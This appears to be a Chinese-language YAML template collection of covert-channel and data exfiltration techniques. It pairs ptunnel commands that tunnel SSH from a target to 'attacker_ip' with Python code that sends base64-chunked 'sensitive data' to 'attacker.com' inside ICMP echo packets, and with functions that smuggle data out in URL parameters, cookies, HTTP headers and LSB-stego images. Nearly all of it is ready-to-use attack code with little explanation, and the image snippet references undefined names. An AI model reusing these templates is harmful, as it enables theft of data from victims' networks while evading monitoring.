# ICMP隧道技术
icmp_tunneling:
  - basic_concept:
    description: |
      # ICMP隧道原理

      # ICMP (ping) 通常被允许出站
      # 在ICMP Echo Request/Reply的数据部分传输

      # 结构:
      # ICMP Header (8 bytes) + Data Payload

      # 可以在Data部分携带任意数据
      # 通常用于小数据量传输

  - ptunnel_usage:
    template: |
      # ptunnel ICMP隧道

      # 1. 服务器端 (攻击者机器)
      ./ptunnel -p password

      # 2. 客户端 (目标机器)
      ./ptunnel -p password -da attacker_ip -dp 22

      # 3. 通过ICMP隧道SSH
      ssh -p 2222 user@localhost

      # 宧户端创建本地端口2222
      # 通过ICMP转发到攻击者的22端口

  - icmp_exfiltration_script:
    template: |
      # ICMP数据外带Python脚本

      import socket
      import struct
      import base64

      class ICMPExfiltrator:
          def __init__(self, target_ip):
              self.target = target_ip
              self.sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)

          def build_icmp_packet(self, data, seq):
              """构建ICMP包"""
              # ICMP头部
              type = 8  # Echo Request
              code = 0
              checksum = 0
              id = 0x1234

              header = struct.pack('!BBHHH', type, code, checksum, id, seq)

              # 计算校验和
              checksum = self.calculate_checksum(header + data)
              header = struct.pack('!BBHHH', type, code, checksum, id, seq)

              return header + data

          def calculate_checksum(self, data):
              """计算ICMP校验和"""
              if len(data) % 2:
                  data += b'\x00'
              s = sum(struct.unpack('!%dH' % (len(data) // 2), data))
              while s >> 16:
                  s = (s >> 16) + (s & 0xffff)
              return ~s & 0xffff

          def send_data(self, data):
              """发送数据"""
              encoded = base64.b64encode(data)
              chunk_size = 64

              for seq, chunk in enumerate(encoded[i:i+chunk_size]
                                          for i in range(0, len(encoded), chunk_size)):
                  packet = self.build_icmp_packet(chunk, seq)
                  self.sock.sendto(packet, (self.target, 0))

      # 使用
      exfil = ICMPExfiltrator("attacker.com")
      exfil.send_data(b"sensitive data")

# HTTP隐蔽通道
http_covert_channel:
  - basic_concept:
    description: |
      # HTTP隐蔽通道

      # 利用HTTP协议特征传输数据:
      # 1. URL参数隐藏
      # 2. Cookie隐藏
      # 3. Header隐藏
      # 4. POST Body隐藏
      # 5. Chunked编码
      # 6. 图片隐写

  - url_parameter_encoding:
    template: |
      # URL参数编码

      import requests
      import base64

      def exfil_via_url(target, data):
          """通过URL参数外带"""
          # 编码数据
          encoded = base64.urlsafe_b64encode(data).decode()

          # 分段传输
          chunk_size = 50
          for i, chunk in enumerate([encoded[j:j+chunk_size]
                                      for j in range(0, len(encoded), chunk_size)]):
              # 伪装成正常参数
              url = f"{target}/search?q=test&d={chunk}&s={i}"
              requests.get(url)

      # 接收端从URL参数提取数据

  - cookie_encoding:
    template: |
      # Cookie编码传输

      import requests
      import base64

      def exfil_via_cookie(target, data):
          """通过Cookie外带"""
          encoded = base64.b64encode(data).decode()

          # 设置Cookie
          cookies = {
              'session': 'normal_session_id',
              'data': encoded[:100],  # 第一部分
              'd2': encoded[100:200],  # 第二部分
          }

          requests.get(target, cookies=cookies)

  - header_encoding:
    template: |
      # HTTP Header编码

      import requests
      import base64

      def exfil_via_header(target, data):
          """通过Header外带"""
          encoded = base64.b64encode(data).decode()

          headers = {
              'User-Agent': f'Mozilla/5.0 {encoded[:50]}',
              'X-Forwarded-For': f'192.168.1.1, {encoded[50:100]}',
              'Referer': f'{target}/{encoded[100:150]}',
              'X-Custom-Data': encoded[150:200],
          }

          requests.get(target, headers=headers)

  - steganography_image:
    template: |
      # 图片隐写外带

      # 在图片中隐藏数据

      import PIL.Image as Image

      def hide_data_in_image(image_path, data, output_path):
          """LSB隐写"""
          img = Image.open(image_path)
          pixels = img.load()

          # 将数据编码到像素LSB
          binary_data = ''.join(format(byte, '08b') for byte in data)

          data_index = 0
          for i in range(img.width):
              for j in range(img.height):
                  if data_index < len(binary_data):
                      r, g, b = pixels[i, j]
                      # 修改LSB
                      r = (r & ~1) | int(binary_data[data_index])
                      data_index += 1
                      if data_index < len(binary_data):
                          g = (g & ~1) | int(binary_data[data_index])
                          data_index += 1
                      if data_index < len(binary_data):
                          b = (b & ~1) | int(binary_data[data_index])
                          data_index += 1
                      pixels[i, j] = (r, g, b)

          img.save(output_path)

      # 上传图片到目标
      requests.post(target, files={'image': open(output_path, 'rb')})

